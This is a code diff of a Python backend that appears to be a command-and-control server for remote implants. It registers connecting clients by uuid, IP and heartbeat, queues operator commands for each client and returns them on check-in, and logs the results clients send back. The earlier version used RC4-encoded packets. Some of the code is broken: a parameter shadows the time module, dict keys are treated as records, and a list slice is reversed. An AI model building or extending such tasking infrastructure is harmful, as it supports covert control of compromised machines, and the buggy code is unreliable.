@@ -2,51 +2,84 @@
 import asyncio
 from app.utils import *
 from threading import Timer
-from time import sleep
+import time
+from json import dumps
+
+Conn = {"test":{"uuid":"test","ip":"192.168.0.1","info":{"remarks":"test"}}}
+Events = {"global":[],"test":["this is test"]}
+Do = {}
+
+def get_conn(uuid):
+    return Conn[uuid]
+
+def get_list(length=0):
+    if length == 0 or length>=len(Conn):
+        return Conn
+    else:
+        # todo: 整个分页
+        return Conn
+
+def add_events(uuid,data):
+    if uuid not in Events:
+        return False
+    else:
+        Events[uuid].append(data)
+        return True
 
 
-Conn = {}
-
-
-def get_list():
-    l = []
-    for k in Conn:
-        l.append({
-            "uuid": k,
-            "conn": Conn[k],
-
-        })
-    return l
-
-
-def get_action():
-    return events.get()
+def get_events(uuid,length=20):
+    if uuid not  in Events:
+        return []
+    if len(Events[uuid]) < length:
+        return Events[uuid]
+    else:
+        return Events[uuid][:-length]
 
 
 def do_action(uuid, do_something):
-    if uuid not in Conn:
+    if uuid not in Conn and uuid not in Do:
         return False
-    Conn[uuid]["do"].append(do_something)
+    Do[uuid].append(do_something)
     return True
 
-
-def online(uuid):
-    print("[!][BackEnd]Online:{}".format(uuid))
+def clear(time=60000):
+    for i in Conn:
+        if int(round(time.time() * 1000)) - i["sleep"] > time:
+            offline(i["uuid"])
 
 
 def offline(uuid):
     if uuid in Conn:
         Conn.pop(uuid)
+        Events.pop(uuid)
+        Do.pop(uuid)
 
 
 def handle(packet,ip):
-    raw = rc4_decode(packet)
-    data = loads(raw)
-    first = False
-    if "uuid" not in data or "info" not in data:
+    data = loads(packet)
+    if "uuid" not in data:
         return "", 404
     else:
-        pass
-    return rc4_encode(
-        
-    )
+        print("[!][BackEnd]Online:{}".format(ip))
+        add_events("global","[+]%s:Online IP:%s" % (time.asctime(time.localtime(time.time())),ip)  )
+
+        Conn[data["uuid"]] = {
+        "ip":ip,
+        "uuid":data["uuid"],
+        "sleep":data["sleep"],
+        "heartbeat":int(round(time.time() * 1000)),
+        "info":data["info"],
+        }
+        if data["uuid"] not in Events:
+            Events[data["uuid"]] = []
+        else:
+            for i in data["result"]:
+                event = "Client %s>>>\n%s\nClient End <<<\n\n" %(time.asctime(time.localtime(time.time())),i)
+                add_events(data["uuid"],event)
+
+        if data["uuid"] not in Do:
+            Do[data["uuid"]] = []
+    ret = dumps(Do[data["uuid"]])
+
+    Do[data["uuid"]] = []
+    return ret
